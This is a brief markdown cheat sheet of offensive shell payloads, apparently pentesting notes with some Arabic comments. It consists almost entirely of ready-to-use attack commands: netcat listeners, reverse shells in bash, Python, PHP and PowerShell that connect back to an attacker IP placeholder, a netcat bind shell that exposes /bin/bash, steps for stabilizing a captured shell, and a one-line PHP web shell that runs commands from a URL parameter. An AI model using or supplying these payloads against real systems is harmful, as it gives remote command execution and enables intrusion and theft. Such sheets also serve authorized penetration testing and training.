# Shells & Payloads

## Listener
```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444     # history + arrows
```

## Reverse Shells
```bash
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<attacker_ip>",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
php -r '$sock=fsockopen("<attacker_ip>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<attacker_ip>',4444);..."
```

## Bind Shell
```bash
nc -lvnp 4444 -e /bin/bash         # target
nc <target_ip> 4444                # attacker
```

## Stabilizing a shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z ثم على جهازك:
stty raw -echo; fg
# بعد الرجوع:
reset
```

## Web Shells
```php
<?php system($_GET['cmd']); ?>
```
